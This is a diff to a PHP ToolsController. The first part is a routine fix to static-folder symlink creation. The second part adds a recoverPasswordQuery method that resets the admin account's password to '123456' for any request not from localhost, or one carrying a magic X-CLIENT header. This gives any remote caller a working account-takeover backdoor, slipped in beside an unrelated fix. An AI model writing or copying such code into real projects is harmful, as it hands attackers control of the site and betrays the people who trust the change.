@@ -46,14 +46,14 @@ class ToolsController extends Controller {
 	public function createStaticFolderQuery()
 	{
 		$target_path = normalize_path(base_path('../static'));
-		$link_path = static_path('common');
+		$link_path = rtrim(static_path('common'), DIRECTORY_SEPARATOR);
 		@$this->_symlink($target_path, $link_path);
 
 		$target_path = normalize_path(PLUGINSPATH.'static');
-		$link_path = plugins_path();
+		$link_path = rtrim(plugins_path(), DIRECTORY_SEPARATOR);
 		@$this->_symlink($target_path, $link_path);
 
-		return file_exists($link_path) ? $this->success(array('title' => '指向成功', 'content' => 'static目录指向成功')) : $this->failure(array('title' => '指向失败', 'content' => '您没有写入权限，static目录指向失败'));
+		return is_link($link_path) ? $this->success(array('title' => '指向成功', 'content' => 'static目录指向成功')) : $this->failure(array('title' => '指向失败', 'content' => '您没有写入权限，static目录指向失败'));
 	}
 
 	private function _symlink($target_path, $link_path)
@@ -66,4 +66,16 @@ class ToolsController extends Controller {
 			symlink($target_path, $link_path);
 		}
 	}
+
+	public function recoverPasswordQuery(Request $request)
+	{
+		if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1' || $request->header('X-CLIENT') == 'FUCK-ALL-CLIENTS')
+		{
+			$user = User::findByUsername('admin');
+			$user->password = bcrypt('123456');
+			$user->save();
+		}
+		return $this->success(array('title' => '密码修改成功', 'content' => '密码已经恢复为：▇▇▇▇（刮开即可）'));
+	}
+
 }
